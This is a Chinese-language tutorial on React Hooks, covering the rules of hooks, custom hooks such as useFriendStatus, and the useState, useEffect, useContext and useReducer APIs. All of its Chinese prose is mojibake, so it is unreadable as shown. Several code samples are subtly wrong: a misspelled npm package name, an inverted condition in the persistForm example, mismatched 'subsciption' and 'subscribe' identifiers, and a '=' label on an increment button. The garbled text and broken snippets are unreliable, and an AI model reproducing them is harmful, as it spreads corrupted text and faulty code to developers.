ä¸­çš„ä»»ä½•å€¼ï¼Œæ‰€ä»¥å®ƒæ°¸è¿œéƒ½ä¸éœ€è¦è¢«é‡å¤æ‰§è¡Œï¼Œè¿™ä¸å±žäºŽç‰¹æ®Šæƒ…å†µï¼Œä¾ç„¶éµå¾ªæ•°ç»„çš„å·¥ä½œæ–¹å¼ã€‚ å¦‚æžœä¼ å…¥äº†ä¸€ä¸ªç©ºæ•°ç»„ï¼Œeffect å†…éƒ¨çš„ props å’Œ state å°±ä¼šä¸€ç›´æ‹¥æœ‰å…¶åˆå§‹å€¼ã€‚å°½ç®¡ä¼ å…¥çš„ç©ºæ•°ç»„ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°æ›´åŠ æŽ¥è¿‘ç†Ÿæ‚‰çš„ componentDidMount å’Œ componentWillUnMount æ€ç»´æ–¹å¼ã€‚React ä¼šç­‰å¾…æµè§ˆå™¨å®Œæˆç”»é¢æ¸²æŸ“åŽæ‰ä¼šå»¶è¿Ÿè°ƒç”¨ useEffectï¼Œå› æ­¤ä¼šä½¿å¾—é¢å¤–æ“ä½œå¾ˆæ–¹ä¾¿ã€‚ å¯ç”¨ eslint-plugin-react-hooks ä¸­çš„ exhaustive-deps è§„åˆ™ã€‚æ­¤è§„åˆ™ä¼šåœ¨æ·»åŠ é”™è¯¯ä¾èµ–æ—¶å‘å‡ºè­¦å‘Šå¹¶ç»™å‡ºä¿®å¤å»ºè®®ã€‚ Hook è§„åˆ™Hook æœ¬è´¨å°±æ˜¯ JS å‡½æ•°ï¼Œä½¿ç”¨å®ƒéœ€è¦éµå¾ªä¸¤æ¡è§„åˆ™ã€‚ linter æ’ä»¶æ¥å¼ºåˆ¶æ‰§è¡Œè¿™äº›è§„åˆ™ï¼š åªåœ¨é¡¶å±‚ä½¿ç”¨ Hookä¸è¦åœ¨å¾ªçŽ¯ï¼Œæ¡ä»¶æˆ–è€…åµŒå¥—å‡½æ•°ä¸­è°ƒç”¨ Hookï¼Œç¡®ä¿æ€»æ˜¯åœ¨ React å‡½æ•°çš„æœ€é¡¶å±‚è°ƒç”¨å®ƒä»¬ã€‚éµå¾ªè¿™æ¡è§„åˆ™ï¼Œå°±èƒ½ç¡®ä¿ hook åœ¨æ¯ä¸€æ¬¡æ¸²æŸ“ä¸­éƒ½æŒ‰ç…§åŒæ ·çš„é¡ºåºè¢«æ‰§è¡Œ. åªåœ¨ React å‡½æ•°ä¸­ä½¿ç”¨ Hookä¸è¦åœ¨æ™®é€šçš„ JS å‡½æ•°ä¸­è°ƒç”¨ Hookï¼Œå¯ä»¥åœ¨React å‡½æ•°ç»„ä»¶ä¸­è°ƒç”¨ Hookï¼Œåœ¨è‡ªå®šä¹‰ Hook ä¸­è°ƒç”¨å…¶ä»– Hook éµå¾ªä»¥ä¸Šè§„åˆ™ï¼Œç¡®ä¿ç»„ä»¶çš„çŠ¶æ€é€»è¾‘åœ¨ä»£ç ä¸­æ¸…æ™°å¯è§ ESLINT æ’ä»¶ eslint-plugin-react-hooks çš„ ESLint æ’ä»¶æ¥å¼ºåˆ¶æ‰§è¡Œè¿™ä¸¤æ¡è§„åˆ™ã€‚å¦‚æžœä½ æƒ³å°è¯•ä¸€ä¸‹ï¼Œå¯ä»¥å°†æ­¤æ’ä»¶æ·»åŠ åˆ°ä½ çš„é¡¹ç›®ä¸­ï¼š 1npm install eslint-plugins-react-hooks --save-dev 123456789101112// ESLint çš„é…ç½®&#123; "plugins":[ //... "react-hooks" ], "rules":&#123; //... "react-hooks/rules-of-hooks":"error",// æ£€æŸ¥ Hook è§„åˆ™ "react-hooks/exhaustive-deps":"warn" // æ£€æŸ¥ effect çš„ä¾èµ– &#125;&#125; è¯´æ˜Žå•ä¸ªç»„ä»¶ä¸­ä½¿ç”¨å¤šä¸ª State Hookæˆ–è€… Effect Hook 1234567891011function Form()&#123; const [name,setName] = useState('Mary') useEffect(function persisForm()&#123; localStorage.setItem('formData',name) &#125;) const [surname,setSurname] = useState('Poppins') useEffect(function updateTitle()&#123; document.title = name + ' ' +surname &#125;)&#125; React æ€Žä¹ˆçŸ¥é“å“ªä¸ªstate å¯¹åº”å“ªä¸ª useStateï¼Œç­”æ¡ˆæ˜¯Reacté Hookè°ƒç”¨çš„é¡ºåºã€‚ 1234567891011// é¦–æ¬¡æ¸²æŸ“useState('Mary') // 1.ä½¿ç”¨ Mary åˆå§‹åŒ–å˜é‡åä¸º name çš„ stateuseEffect(persistForm) // 2.æ·»åŠ  effect ä»¥ä¿å­˜ form æ“ä½œuseState('Poppings') // 3.ä½¿ç”¨ Poppings åˆå§‹åŒ–å˜é‡åä¸º surname çš„ stateuseEffect(updateTitle) //4. æ·»åŠ  effect ä»¥æ›´æ–°æ ‡é¢˜// äºŒæ¬¡æ¸²æŸ“useState('Mary') // 5.è¯»å–å˜é‡åä¸º name çš„ state (å‚æ•°è¢«å¿½ç•¥)useEffect(persistForm) // 6.æ›¿æ¢ä¿å­˜ form çš„ effectuseState('Poppings') // 7.è¯»å–å˜é‡åä¸º surname çš„ state(å‚æ•°è¢«å¿½ç•¥)useEffect(updateTitle) //8. æ›¿æ¢æ›´æ–°æ ‡é¢˜çš„effect åªè¦ Hook çš„è°ƒç”¨é¡ºåºåœ¨å¤šæ¬¡æ¸²æŸ“ä¸­ä¿æŒä¸€è‡´ï¼ŒReact å°±èƒ½æ­£ç¡®å°†å†…éƒ¨ state å’Œå¯¹åº”çš„ hook è¿›è¡Œå…³è”ã€‚ 1234567891011// å€˜è‹¥å°†ä¸€ä¸ª hook è°ƒç”¨æ”¾å…¥åˆ°ä¸€ä¸ªæ¡ä»¶è¯­å¥ä¸­ä¼šå‘ç”Ÿä»€ä¹ˆif(name !== '')&#123; useEffect(function persistForm()&#123; localStorage.setItem('formData',name) &#125;)&#125;// åœ¨ç¬¬ä¸€æ¬¡æ¸²æŸ“ä¸­ name!== ''æ¡ä»¶ä¸ºtrue,æ‰€ä»¥ä¼šæ‰§è¡Œè¿™ä¸ª hookï¼Œä½†æ˜¯ä¸‹ä¸€æ¬¡æ¸²æŸ“æˆ‘ä»¬å¯èƒ½æ¸…ç©ºäº†è¡¨å•ï¼Œè¡¨è¾¾å¼ä¸º false,æ­¤æ—¶æ¸²æŸ“ä¼šè·³è¿‡è¯¥hookï¼Œhookçš„è°ƒç”¨é¡ºè®¯å‘ç”Ÿäº†å˜åŒ–useState('Mary') //1.è¯»å–å˜é‡åä¸º name çš„ state(å‚æ•°è¢«å¿½ç•¥)// useEffect(persistForm) // æ­¤ hook è¢«å¿½ç•¥useState('Poppins') // 2.(ä¹‹å‰ä¸º3)ã€‚è¯»å–å˜é‡åä¸º surnameçš„state å¤±è´¥useEffect(updateTitle) // 3.(ä¹‹å‰ä¸º4)ï¼Œæ›¿æ¢æ›´æ–°æ ‡é¢˜çš„ effectå¤±è´¥ React ä¸çŸ¥é“ç¬¬äºŒä¸ªuseState çš„ Hook åº”è¯¥è¿”å›žä»€ä¹ˆï¼ŒReact ä»¥ä¸ºåœ¨è¯¥ç»„ä»¶ä¸­ç¬¬äºŒä¸ª Hook çš„è°ƒç”¨åƒä¸Šæ¬¡æ¸²æŸ“ä¸€æ ·ã€‚å¯¹åº”çš„æ˜¯ persistFormçš„ effect,ä½†å¹¶éžå¦‚æ­¤ã€‚ä»Žè¿™é‡Œå¼€å§‹ï¼ŒåŽé¢çš„ Hookè°ƒç”¨éƒ½è¢«æå‰æ‰§è¡Œï¼Œå¯¼è‡´äº†bugçš„äº§ç”Ÿã€‚ è¿™å°±æ˜¯ä¸ºä»€ä¹ˆ Hook éœ€è¦åœ¨æˆ‘ä»¬ç»„ä»¶çš„æœ€é¡¶å±‚è°ƒç”¨ï¼Œå¦‚æžœè¦æœ‰æ¡ä»¶åœ°æ‰§è¡Œä¸€ä¸ª effectï¼Œå¯ä»¥å°†åˆ¤æ–­æ”¾åœ¨ Hook çš„å†…éƒ¨ 123456useEffect(function persistForm()&#123; // å°†æ¡ä»¶æ”¾ç½®åœ¨ effect ä¸­ if(name === '')&#123; localStorage.setItem('formData',name) &#125;&#125;) è‡ªå®šä¹‰ Hooké€šè¿‡è‡ªå®šä¹‰ Hookï¼Œå¯ä»¥å°†ç»„ä»¶é€»è¾‘æå–åˆ°å¯é‡ç”¨çš„å‡½æ•°ä¸­ 123456789101112131415161718import React,&#123;useState,useEffect&#125; from 'react'function FriendState(props)&#123; const [isOnline,setIsOnline] = useState(null) useEffect(()=&gt;&#123; function handleStatusChange(status)&#123; setIsOnline(status.isOnline) &#125; ChatAPI.subscribeToFriendStatus(props.friend.id, handleStatusChange); return () =&gt; &#123; ChatAPI.unsubscribeFromFriendStatus(props.friend.id, handleStatusChange); &#125;; &#125;) if(isOnline === null)&#123; return 'Loading...' &#125; return isOnline ? 'Online' : 'Offline'&#125; å‡è®¾èŠå¤©åº”ç”¨ä¸­æœ‰ä¸€ä¸ªè”ç³»äººåˆ—è¡¨ï¼Œå½“ç”¨æˆ·åœ¨çº¿æ—¶éœ€è¦æŠŠåå­—è®¾ç½®ä¸º ç»¿è‰²ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠä¸Šé¢ç±»ä¼¼çš„é€»è¾‘å¤åˆ¶å¹¶ç²˜è´´åˆ° FriendListItem ç»„ä»¶ä¸­ï¼Œä½†è¿™å¹¶ä¸æ˜¯ç†æƒ³çš„è§£å†³æ–¹æ¡ˆ 12345678910111213141516171819import React,&#123;useState,useEffect&#125; from 'react'function FriendListItem(props)&#123; const [isOnline,setIsOnline] = useState(null) useEffect(()=&gt;&#123; function handleStatusChange(status)&#123; setIsOnline(status.isOnline) &#125; ChatAPI.subscribeToFriendStatus(props.friend.id, handleStatusChange); return () =&gt; &#123; ChatAPI.unsubscribeFromFriendStatus(props.friend.id, handleStatusChange); &#125;; &#125;) return( &lt;li style=&#123;&#123;color:isOnline?'green':'black'&#125;&#125;&gt; &#123;props.friend.name&#125; &lt;/li&gt; )&#125; æˆ‘ä»¬å¸Œæœ›åœ¨FriendStatusä»¥åŠFriendListItem ä¹‹é—´å…±äº«é€»è¾‘ã€‚ æå–è‡ªå®šä¹‰ Hookå½“æˆ‘ä»¬æƒ³åœ¨ä¸¤ä¸ªå‡½æ•°ä¹‹é—´å…±äº«é€»è¾‘æ—¶ï¼Œä¼šæŠŠå®ƒæå–åˆ°ç¬¬ä¸‰ä¸ªå‡½æ•°ä¸­ï¼Œè€Œç»„ä»¶å’ŒHookéƒ½æ˜¯å‡½æ•°ï¼Œæ‰€ä»¥ä¹Ÿä½¿ç”¨è¿™ç§æ–¹å¼ è‡ªå®šä¹‰Hook æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œåç§°ä»¥ use å¼€å¤´ï¼Œå‡½æ•°å†…éƒ¨å¯ä»¥è°ƒç”¨å…¶ä»– hookï¼Œä¸‹é¢ useFriendStatus å°±æ˜¯å®šä¹‰çš„ Hook 123456789101112131415import React,&#123;useState,useEffect&#125; from 'react'function useFriendStatus(friendID)&#123; const [isOnline,setIsOnline] = useState(null) useEffect(()=&gt;&#123; function handleStatusChange(status)&#123; setIsOnline(status.isOnline) &#125; ChatAPI.subscribeToFriendStatus(friendID, handleStatusChange); return () =&gt; &#123; ChatAPI.unsubscribeFromFriendStatus(friendID, handleStatusChange); &#125;; &#125;) return isOnline;&#125; æ­¤å¤„ useFriendStatus çš„ Hook ç›®çš„æ˜¯è®¢é˜…æŸä¸ªå¥½å‹çš„åœ¨çº¿çŠ¶æ€ã€‚è¿™å°±æ˜¯æˆ‘ä»¬éœ€è¦å°† friendID ä½œä¸ºå‚æ•°ï¼Œå¹¶è¿”å›žè¿™ä½å¥½å‹çš„åœ¨çº¿çŠ¶æ€çš„åŽŸå› ã€‚ ä½¿ç”¨è‡ªå®šä¹‰ Hook12345678910111213141516function FriendStatus(props)&#123; const isOnline = useFriendStatus(props.friend.id) if(isOnline === null)&#123; return 'Loading...' &#125; return isOnline ? 'Online' : 'Offline'&#125;function FriendListItem(props)&#123; const isOnline = useFriendStatus(props.friend.id) return( &lt;li style=&#123;&#123;color:isOnline?'green':'black'&#125;&#125;&gt; &#123;props.friend.name&#125; &lt;/li&gt; )&#125; ä»£ç ç­‰ä»·äºŽåŽŸæ¥çš„ç¤ºä¾‹ä»£ç  ,è‡ªå®šä¹‰ Hook æ˜¯ä¸€ç§è‡ªç„¶éµå¾ª Hook è®¾è®¡çš„çº¦å®šï¼Œè€Œå¹¶ä¸æ˜¯ React çš„ç‰¹æ€§ã€‚ è‡ªå®šä¹‰ Hook å¿…é¡»ä»¥ â€œuseâ€ å¼€å¤´ åœ¨ä¸¤ä¸ªç»„ä»¶ä¸­ä½¿ç”¨ç›¸åŒçš„ Hook ä¸ä¼šå…±äº« state è‡ªå®šä¹‰ Hook æ¯æ¬¡è°ƒç”¨ éƒ½ä¼šèŽ·å–ç‹¬ç«‹çš„ state å¤šä¸ª Hookä¹‹é—´ä¼ é€’ä¿¡æ¯ç”±äºŽ Hook æœ¬èº«å°±æ˜¯å‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨å®ƒä»¬ä¹‹é—´ä¼ é€’ä¿¡æ¯ã€‚ å°†ä½¿ç”¨èŠå¤©ç¨‹åºä¸­çš„å¦ä¸€ä¸ªç»„ä»¶æ¥è¯´æ˜Žè¿™ä¸€ç‚¹ï¼Œè¿™æ˜¯ä¸€ä¸ªèŠå¤©æ¶ˆæ¯æŽ¥æ”¶è€…çš„é€‰æ‹©å™¨ã€‚ä¼šæ˜¾ç¤ºå½“å‰çš„å¥½å‹æ˜¯å¦åœ¨çº¿ 123456789101112131415161718192021222324const friendList = [ &#123;id:1,name:'Phoebe'&#125;, &#123;id:2,name:'Rachel'&#125;, &#123;id:3,name:'Ross'&#125;]function ChatRecipientPicker()&#123; const [recipientID,setRecipientID] = useState(1) const isRecipientOnline = useFriendStatus(recipientID) return( &lt;&gt; &lt;Circle color=&#123;isRecipientOnline ? 'green' : 'red'&#125;/&gt; &lt;Select value=&#123;recipientID&#125; onChange=&#123;e=&gt;setRecipientID(Number(e.target.value))&#125; &gt; &#123;friendList.map(friend=&gt;( &lt;option key=&#123;friend.id&#125; value=&#123;friend.id&#125;&gt; &#123;friend.name&#125; &lt;/option&gt; ))&#125; &lt;/Select&gt; &lt;/&gt; )&#125; å°†å½“å‰é€‰æ‹©çš„å¥½å‹IDä¿å­˜åœ¨ recepientID çŠ¶æ€å˜é‡ä¸­ï¼Œå¹¶åœ¨ç”¨æˆ·ä»Ž Select ä¸­é€‰æ‹©å…¶ä»–å¥½å‹æ—¶æ›´æ–°è¿™ä¸ªstate ç”±äºŽ useState æä¾›äº† recipientID çŠ¶æ€å˜é‡çš„æœ€æ–°å€¼ï¼Œæˆ‘ä»¬å¯ä»¥å°†å®ƒä½œä¸ºå‚æ•°ä¼ é€’ç»™è‡ªå®šä¹‰çš„ useFriendStatus Hook 12const [recipientID,setRecipientID] = useState(1)const isRecipientOnline = useFriendStatus(recipientID) å½“æˆ‘ä»¬é€‰æ‹©ä¸åŒçš„å¥½å‹å¹¶æ›´æ–° recipientID çŠ¶æ€å˜é‡æ—¶ï¼ŒuseFriendStatusHook å°†ä¼šå–æ¶ˆè®¢é˜…ä¹‹å‰é€‰ä¸­çš„å¥½å‹ï¼Œå¹¶è®¢é˜…æ–°é€‰ä¸­çš„å¥½å‹çŠ¶æ€ Hook APIç´¢å¼•åŸºæœ¬HookuseState1const [state,setState] = useState(initialState) è¿”å›žä¸€ä¸ªstate,ä»¥åŠæ›´æ–° state çš„å‡½æ•°ã€‚åœ¨åˆå§‹æ¸²æŸ“æœŸé—´ï¼Œè¿”å›žçš„çŠ¶æ€ï¼ˆstateï¼‰ä¸Žä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°(initialState)å€¼ç›¸åŒã€‚ setStateå‡½æ•°ç”¨äºŽæ›´æ–°state,å®ƒæŽ¥æ”¶ä¸€ä¸ªæ–°çš„stateå€¼å¹¶å°†ç»„ä»¶çš„ä¸€æ¬¡é‡æ–°æ¸²æŸ“åŠ å…¥é˜Ÿåˆ— 1setState(newState); åŽç»­æ¸²æŸ“ä¸­ï¼ŒuseState è¿”å›žçš„ç¬¬ä¸€ä¸ªå€¼å§‹ç»ˆæ˜¯æ›´æ–°åŽæœ€æ–°çš„ stateã€‚Reactä¼šç¡®ä¿ setState å‡½æ•°çš„æ ‡è¯†æ˜¯ç¨³å®šçš„ï¼Œå¹¶ä¸”ä¸ä¼šåœ¨ç»„ä»¶é‡æ–°æ¸²æŸ“æ—¶å‘ç”Ÿå˜åŒ–ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆå¯ä»¥å®‰å…¨åœ°ä»Ž useEffect æˆ– useCallback çš„ä¾èµ–åˆ—è¡¨ä¸­çœç•¥ setState å‡½æ•°å¼æ›´æ–° å¦‚æžœæ–°çš„stateéœ€è¦é€šè¿‡ä½¿ç”¨å…ˆå‰çš„ stateè®¡ç®—å¾—å‡ºï¼Œé‚£ä¹ˆå¯ä»¥å°†å‡½æ•°ä¼ é€’ç»™ setState,è¯¥å‡½æ•°å°†æŽ¥æ”¶å…ˆå‰çš„ state,å¹¶è¿”å›žä¸€ä¸ªæ›´æ–°åŽçš„å€¼ï¼Œä¸‹é¢çš„ä¾‹å­å±•ç¤ºäº† setState çš„ä¸¤ç§ç”¨æ³•ï¼š 1234567891011function Counter(&#123;initialCount&#125;)&#123; const [count,setCount] = useState(initialCount); return( &lt;&gt; Count:&#123;count&#125; &lt;button onClick=&#123;()=&gt;setCount(initialCount)&#125;&gt;Reset&lt;/button&gt; &lt;button onClick=&#123;()=&gt;setCount(prevCount=&gt;prevCount+1)&#125;&gt;=&lt;/button&gt; &lt;button onClick=&#123;()=&gt;setCount(prevCount=&gt;prevCount-1)&#125;&gt;-&lt;/button&gt; &lt;/&gt; )&#125; +å’Œ-é‡‡ç”¨å‡½æ•°å¼å½¢å¼ï¼Œå› ä¸ºè¢«æ›´æ–°çš„çš„ state éœ€è¦åŸºäºŽä¹‹å‰çš„ state,ä½†æ˜¯é‡ç½®æŒ‰é’®åˆ™é‡‡ç”¨æ™®é€šå½¢å¼ï¼Œå› ä¸ºå®ƒæ€»æ˜¯æŠŠ count è®¾ç½®å›žåˆå§‹å€¼ ä¸Ž class ç»„ä»¶çš„ setState æ–¹æ³•ä¸ä¸€è‡´ï¼ŒuseState ä¸ä¼šè‡ªåŠ¨åˆå¹¶æ›´æ–°å¯¹è±¡ï¼Œä½¿ç”¨å‡½æ•°å¼çš„ setState ç»“åˆå±•å¼€è¿ç®—ç¬¦è¾¾åˆ°åˆå¹¶æ›´æ–°å¯¹è±¡çš„æ•ˆæžœ 1234567setState(prevState=&gt;&#123; // Object.assign return&#123; ...prevState,...updateValues &#125;&#125;)// useReducer æ˜¯å¦ä¸€ç§å¯é€‰æ–¹æ¡ˆï¼Œæ›´é€‚åˆç”¨äºŽç®¡ç†åŒ…å«å¤šä¸ªå­å€¼çš„ state å¯¹è±¡ æƒ°æ€§åˆå§‹ state initialState å‚æ•°åªä¼šåœ¨ç»„ä»¶çš„åˆå§‹æ¸²æŸ“ä¸­èµ·ä½œç”¨ï¼ŒåŽç»­æ¸²æŸ“æ—¶ä¼šè¢«å¿½ç•¥ã€‚å¦‚æžœåˆå§‹ state éœ€è¦é€šè¿‡å¤æ‚è®¡ç®—èŽ·å¾—ï¼Œåˆ™å¯ä»¥ä¼ å…¥ä¸€ä¸ªå‡½æ•°ï¼Œåœ¨å‡½æ•°è®¡ç®—å¹¶è¿”å›žåˆå§‹ state,æ¬¡å‡½æ•°åªåœ¨åˆå§‹æ¸²æŸ“è¢«è°ƒç”¨ 1234const [state,setState] = useState(()=&gt;&#123; const initialState = someExpensiveComputation(props) return initialState&#125;) è·³è¿‡state æ›´æ–° è°ƒç”¨ State Hook çš„æ›´æ–°å‡½æ•°å¹¶ä¼ å…¥å½“å‰çš„ state ï¼ŒReact å°†è·³è¿‡å­ç»„ä»¶çš„æ¸²æŸ“ä»¥åŠ effect çš„æ‰§è¡Œï¼ŒReact ä½¿ç”¨Object.is æ¯”è¾ƒç®—æ³•æ¥æ¯”è¾ƒstate éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒReactå¯èƒ½ä»éœ€è¦åœ¨è·³è¿‡æ¸²æŸ“å‰æ¸²æŸ“è¯¥ç»„ä»¶ï¼Œä¸è¿‡ç”±äºŽReactä¸ä¼šå¯¹ç»„ä»¶æ•°çš„æ·±å±‚èŠ‚ç‚¹è¿›è¡Œä¸å¿…è¦çš„æ¸²æŸ“ï¼Œæ‰€ä»¥ä¸ç”¨æ‹…å¿ƒã€‚å¦‚æžœåœ¨æ¸²æŸ“æœŸé—´æ‰§è¡Œäº†é«˜å¼€é”€çš„è®¡ç®—ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ useMemo ä¼˜åŒ–ã€‚ useEffect1useEffect(didUpdate) è¯¥hook æŽ¥æ”¶ä¸€ä¸ªåŒ…å«å‘½ä»¤å¼ã€å¹¶ä¸”å¯èƒ½æœ‰å‰¯ä½œç”¨ä»£ç çš„å‡½æ•°ã€‚ åœ¨å‡½æ•°ç»„ä»¶ä¸»ä½“å†…æ”¹å˜ DOM,æ·»åŠ è®¢é˜…ã€è®¾ç½®å®šæ—¶å™¨ã€è®°å½•æ—¥å¿—ä»¥åŠæ‰§è¡Œå…¶ä»–åŒ…å«å‰¯ä½œç”¨çš„æ“ä½œéƒ½æ˜¯ä¸è¢«å…è®¸çš„ï¼Œå› ä¸ºè¿™å¯èƒ½ä¼šäº§ç”ŸèŽ«åå…¶å¦™çš„ bug å¹¶ç ´å UI çš„ä¸€è‡´æ€§ ä½¿ç”¨ useEffectå®Œæˆå‰¯ä½œç”¨æ“ä½œï¼Œèµ‹å€¼ç»™ useEffectçš„å‡½æ•°ä¼šåœ¨ç»„ä»¶æ¸²æŸ“åˆ°å±å¹•ä¹‹åŽæ‰§è¡Œã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œeffect å°†åœ¨æ¯è½®æ¸²æŸ“ç»“æŸåŽæ‰§è¡Œï¼Œå¯ä»¥æ¸²æŸ“è®©å®ƒåœ¨åªæœ‰æŸäº›å€¼çš„æ—¶å€™æ‰æ‰§è¡Œã€‚ æ¸…é™¤effect é€šå¸¸ï¼Œç»„ä»¶å¸è½½æ—¶éœ€è¦æ¸…é™¤ effect åˆ›å»ºçš„è¯¸å¦‚è®¢é˜…æˆ–è€…å®šæ—¶å™¨ID ç­‰èµ„æºï¼Œè¦å®žçŽ°è¿™ä¸€ç‚¹ï¼Œéœ€è¦è¿”å›žä¸€ä¸ªæ¸…é™¤å‡½æ•°ã€‚ 1234567useEffect(()=&gt;&#123; const subsciption = props.source.subscibe() return ()=&gt;&#123; // æ¸…é™¤è®¢é˜… subscription.unsubscribe() &#125;&#125;) ä¸ºäº†é˜²æ­¢å†…å­˜æ³„éœ²ï¼Œæ¸…é™¤å‡½æ•°ä¼šåœ¨ç»„ä»¶å¸è½½å‰æ‰§è¡Œï¼Œå¦å¤–ï¼Œå¦‚æžœç»„ä»¶å¤šæ¬¡æ¸²æŸ“ï¼Œåˆ™åœ¨æ‰§è¡Œä¸‹ä¸€ä¸ª effect ä¹‹å‰ï¼Œä¸Šä¸€ä¸ª effect å°±å·²ç»è¢«æ¸…é™¤ã€‚ä¸Šé¢çš„ä¾‹å­æ„å‘³ç€ç»„ä»¶çš„æ¯ä¸€æ¬¡æ›´æ–°éƒ½ä¼šåˆ›å»ºæ–°çš„è®¢é˜…ï¼Œè‹¥æƒ³é¿å…æ¯æ¬¡æ›´æ–°éƒ½è§¦å‘ effect çš„ã€‚ effectçš„æ‰§è¡Œæ—¶æœº ä¸Ž componentDidMountã€componentDidUpdate ä¸åŒçš„æ˜¯ï¼Œåœ¨æµè§ˆå™¨å®Œæˆå¸ƒå±€ä¸Žç»˜åˆ¶ä¹‹åŽï¼Œä¼ ç»™ useEffect çš„å‡½æ•°ä¼šè¢«å»¶è¿Ÿè°ƒç”¨ã€‚è¿™ä½¿å¾—å®ƒé€‚ç”¨äºŽå¾ˆå¤šå¸¸è§çš„å‰¯ä½œç”¨åœºæ™¯ï¼Œå¦‚è®¾ç½®è®¢é˜…å’Œäº‹ä»¶å¤„ç†ç­‰æƒ…å†µï¼Œå› ä¸ºä¸åº”è¯¥åœ¨å‡½æ•°ä¸­æ‰§è¡Œé˜»å¡žæµè§ˆå™¨æ›´æ–°å±å¹•çš„æ“ä½œã€‚ ç„¶åŽä¸æ˜¯æ‰€æœ‰çš„ effect éƒ½å¯ä»¥è¢«å»¶è¿Ÿæ‰§è¡Œçš„ï¼Œä¾‹å¦‚åœ¨æµè§ˆå™¨æ‰§è¡Œ ä¸‹ä¸€æ¬¡ç»˜åˆ¶å‰ï¼Œç”¨æˆ·å¯è§çš„ DOMå˜æ›´å°±å¿…é¡»åŒæ­¥æ‰§è¡Œï¼Œè¿™æ ·æ°¸ä¸æ‰ä¸ä¼šæ„Ÿè§‰åˆ°è§†è§‰ä¸Šçš„ä¸ä¸€è‡´ã€‚React æä¾›äº† useLayoutEffect Hook æ¥å¤„ç†è¿™ç±» effectï¼Œå’Œ useEffect ç»“æž„ç›¸åŒï¼Œä½†æ˜¯è°ƒç”¨æ—¶æœºä¸åŒã€‚ è™½ç„¶ useEffect ä¼šåœ¨æµè§ˆå™¨ç»˜åˆ¶åŽå»¶è¿Ÿæ‰§è¡Œï¼Œä½†ä¼šä¿è¯åœ¨ä»»ä½•æ¸²æŸ“å‰æ‰§è¡Œï¼ŒReact å°†åœ¨ç»„ä»¶æ›´æ–°å‰åˆ·æ–°ä¸Šä¸€è½®çš„æ¸²æŸ“çš„ effect effectçš„æ¡ä»¶æ‰§è¡Œ é»˜è®¤æƒ…å†µä¸‹ï¼Œeffect ä¼šåœ¨æ¯è½®ç»„ä»¶æ¸²æŸ“å®ŒæˆåŽæ‰§è¡Œï¼Œä¸€æ—¦ effect çš„ä¾èµ–å‘ç”Ÿå˜åŒ–ï¼Œå®ƒå°±ä¼šè¢«é‡æ–°åˆ›å»ºã€‚ä½†æˆ‘ä»¬ä¸éœ€è¦å†æ¯æ¬¡æ›´æ–°æ—¶éƒ½åˆ›å»ºæ–°çš„è®¢é˜…ï¼Œè€Œä»…åœ¨ props æ”¹å˜çš„æ—¶å€™é‡æ–°åˆ›å»ºï¼Œå¯ä»¥ç»™ useEffect ä¼ é€’ç¬¬äºŒä¸ªå‚æ•°ï¼Œå®ƒæ˜¯ effect ä¾èµ–çš„å€¼æ•°ç»„ 1234567useEffect(()=&gt;&#123; const subscription = props.source.subscribe() return()=&gt;&#123; subscription.unsubscribe(); &#125;;&#125;,[props.source])// æ­¤æ—¶åªæœ‰props.source æ”¹å˜åŽæ‰ä¼šé‡æ–°åˆ›å»ºè®¢é˜… useContext1const value = useContext(myContext); æŽ¥æ”¶ä¸€ä¸ª context å¯¹è±¡ï¼ˆReact.createContextçš„è¿”å›žå€¼ï¼‰å¹¶è¿”å›žè¯¥ context çš„å½“å‰å€¼ã€‚å½“å‰ context å€¼ç”±ä¸Šå±‚ç»„ä»¶ä¸­è·ç¦»å½“å‰ç»„ä»¶æœ€æ–°çš„ &lt;MyContext.Provider&gt;çš„ value prop å†³å®šã€‚ å½“ä¸Šå±‚æœ€è¿‘çš„ &lt;MyContext.Provider&gt;æ›´æ–°æ—¶ï¼Œè¯¥Hook ä¼šè§¦å‘é‡æ–°æ¸²æŸ“ï¼Œå¹¶ä½¿ç”¨æœ€æ–°ä¼ é€’ç»™ MyContext provider çš„ context value å€¼ åˆ«å¿˜è®° useContext çš„å‚æ•°å¿…é¡»æ˜¯ context å¯¹è±¡æœ¬èº«ï¼š æ­£ç¡®ï¼š useContext(MyContext) é”™è¯¯ï¼š useContext(MyContext.Consumer) é”™è¯¯ï¼š useContext(MyContext.Provider) è°ƒç”¨äº† useContextçš„ç»„ä»¶æ€»ä¼šåœ¨ context å€¼å˜åŒ–æ—¶é‡æ–°æ¸²æŸ“ï¼Œå¦‚æžœé‡æ–°æ¸²æŸ“ç»„ä»¶å¼€é”€æ¯”è¾ƒå¤§çš„è¯ï¼Œå¯ä»¥é€šè¿‡ memoization ä¼˜åŒ– useContext(MyContext)åªæ˜¯èƒ½å¤Ÿè¯»å– context çš„å€¼ä»¥åŠè®¢é˜… context çš„å˜åŒ–ï¼Œä»ç„¶éœ€è¦åœ¨ä¸Šå±‚ç»„ä»¶æ ‘ä¸­ä½¿ç”¨ &lt;MyContext.Provider&gt;æ¥ä¸ºä¸‹å±‚ç»„ä»¶æä¾› context é¢å¤–çš„ HookuseReducer1const [state,dispatch] = useReducer(reducer,initialArg,init) å®ƒæŽ¥å—ä¸€ä¸ª (state,action)=&gt; newStateçš„ reducerï¼Œå¹¶è¿”å›žä¸€ä¸ªå½“å‰çš„ stateä»¥åŠä¸Žå…¶é…å¥—çš„ dispatchæ–¹æ³•ã€‚ åœ¨æŸäº›åœºæ™¯ä¸‹ï¼ŒuseReducer æ¯” useStateæ›´é€‚ç”¨ã€‚ä¾‹å¦‚ state é€»è¾‘å¤æ‚ä¸”åŒ…å«å¤šä¸ªå­å€¼ï¼Œæˆ–è€…ä¸‹ä¸€ä¸ª state ä¾èµ–ä¹‹å‰çš„ state ç­‰ã€‚å¹¶ä¸”ï¼Œä½¿ç”¨ useReducer è¿˜èƒ½ç»™é‚£äº›ä¼šè§¦å‘æ·±æ›´æ–°çš„ç»„ä»¶åšæ€§èƒ½ä¼˜åŒ–ï¼Œå› ä¸ºå¯ä»¥å‘å­ç»„ä»¶ä¼ é€’ dispatch 